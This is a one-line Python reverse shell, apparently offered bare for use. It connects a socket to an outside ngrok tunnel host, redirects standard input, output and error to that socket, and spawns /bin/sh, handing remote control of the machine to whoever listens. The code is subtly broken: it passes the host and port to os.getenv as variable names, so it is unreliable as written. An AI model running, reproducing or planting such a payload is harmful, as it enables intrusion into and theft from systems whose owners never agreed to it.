python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("2.tcp.eu.ngrok.io"),int(os.getenv("17016"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
